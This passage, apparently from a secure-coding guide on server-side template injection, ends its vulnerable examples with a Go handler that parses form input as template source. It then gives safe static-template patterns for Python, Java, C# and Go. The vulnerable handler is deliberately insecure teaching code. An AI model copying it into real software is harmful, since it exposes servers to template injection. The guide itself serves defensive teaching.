<div>${userHeaderSnippet}</div>
```

### Go

```go
func previewNewsletter(w http.ResponseWriter, r *http.Request) {
    header := r.FormValue("header")
    tmpl, _ := template.New("preview").Parse("{{ define \"main\" }}" + header + "{{ end }}")
    tmpl.ExecuteTemplate(w, "main", nil)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Load templates from files. Pass user data only as render variables.

```python
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/email/preview")
def email_preview():
    subject = request.args.get("subject", "Your invoice")
    return render_template("email_preview.html", subject=subject)
```

```html
{# email_preview.html — static template file *#}
<p>Subject: {{ subject }}</p>
```

**Important:** Never call `Environment.from_string()` or `Template()` on HTTP request data. Use `FileSystemLoader` with static templates on disk.

```python
# Rich text — sanitize, do not compile as template:
import bleach
clean_subject = bleach.clean(subject, tags=[], strip=True)
```

### Java

Precompile static templates from classpath resources. Pass user content via model attributes only.

```java
@GetMapping("/email/preview")
public String preview(@RequestParam String subject, Model model) {
    model.addAttribute("subject", subject); // data variable, not template source
    return "email_preview"; // static email_preview.html with th:text="${subject}"
}
```

```html
<!-- email_preview.html -->
<p th:text="${subject}"></p>
```

**Important:** Never call `TemplateEngine.process(String userTpl, ...)` on HTTP input. Avoid `th:utext` on untrusted fields.

### C#

Ship precompiled Razor views. Do not compile arbitrary strings from users.

```cshtml
@* EmailPreview.cshtml — user content as encoded model field *@
<p>@Model.Subject</p>
```

```csharp
public IActionResult Preview(EmailPreviewRequest request)
{
    return View(new EmailPreviewViewModel { Subject = request.Subject });
}
```

**Important:** Avoid `CompileRenderStringAsync` on HTTP bodies unless heavily sandboxed and restricted to break-glass admin roles.

### Go

Parse known template files at startup. Never `Parse(userInput)` on request bodies.

```go
//go:embed templates/*
var tmplFS embed.FS

var emailTmpl = template.Must(
    template.ParseFS(tmplFS, "templates/email_preview.html"))

func emailPreview(w http.ResponseWriter, r *http.Request) {
    subject := r.URL.Query().Get("subject")
    emailTmpl.Execute(w, struct{ Subject string }{Subject: subject})
}
```

**Important:** Pass user strings as template data fields, not as template definitions. Use `embed.FS` or `ParseGlob` at startup.

